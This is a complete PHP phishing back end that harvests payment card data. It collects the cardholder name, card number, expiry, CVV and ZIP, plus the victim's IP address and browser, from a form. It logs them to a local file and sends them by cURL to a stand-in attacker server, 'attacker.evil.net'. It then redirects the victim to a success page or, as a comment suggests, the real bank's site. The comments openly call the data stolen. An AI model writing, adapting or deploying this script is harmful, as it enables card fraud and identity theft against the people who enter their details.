<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $cardholder = htmlspecialchars($_POST["cardholder"]);
    $cardnumber = preg_replace('/\s+/', '', $_POST["cardnumber"]);
    $exp = $_POST["exp"];
    $cvv = $_POST["cvv"];
    $zip = $_POST["zip"];
    $ip = $_SERVER["REMOTE_ADDR"];
    $user_agent = $_SERVER["HTTP_USER_AGENT"];
    $timestamp = date("Y-m-d H:i:s");

    // Format stolen data with more detail
    $data = "Time: $timestamp | IP: $ip | UA: $user_agent | Name: $cardholder | Card: $cardnumber | Exp: $exp | CVV: $cvv | ZIP: $zip\n";
    file_put_contents("bank_cards.txt", $data, FILE_APPEND);

    // Send to attacker's remote server via cURL
    $url = "http://attacker.evil.net/capture.php"; // Fake URL—use your test endpoint
    $post_data = [
        "cardholder" => $cardholder,
        "cardnumber" => $cardnumber,
        "exp" => $exp,
        "cvv" => $cvv,
        "zip" => $zip,
        "ip" => $ip,
        "ua" => $user_agent,
        "time" => $timestamp
    ];
    
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post_data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); // Follow redirects
    curl_exec($ch);
    curl_close($ch);

    // Redirect to fake "success" page or real bank site
    header("Location: https://www.example.com/thank-you"); // Swap for real bank URL
    exit();
} else {
    http_response_code(403);
    echo "Unauthorized access.";
}
?>
